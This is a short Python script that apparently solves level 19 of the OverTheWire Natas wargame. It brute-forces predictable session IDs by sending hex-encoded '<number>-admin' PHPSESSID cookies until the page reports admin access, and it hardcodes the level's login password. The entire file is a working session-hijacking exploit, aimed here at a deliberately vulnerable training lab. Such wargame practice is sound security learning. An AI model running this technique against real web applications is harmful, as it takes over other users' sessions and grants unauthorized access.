import requests

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

# response = session.post(
#     url, data={"username": "admin", "password": "password"}, auth=(username, password))
# print(bytes.fromhex(session.cookies["PHPSESSID"]).decode('utf-8'))

# print("test".encode("utf-8").hex())

max_id = 640
admin_id = 0

for session_id in range(max_id + 1):
    print("Trying session id {} now".format(session_id))
    encoded_session_id = "{}-admin".format(session_id).encode("utf-8").hex()
    response = session.get(
        url, cookies={"PHPSESSID": "{}".format(encoded_session_id)}, auth=(username, password))
    content = response.text
    if "You are an admin." in content:
        admin_id = session_id
        print(content)
        break

print("Session id for admin found: {}".format(admin_id))
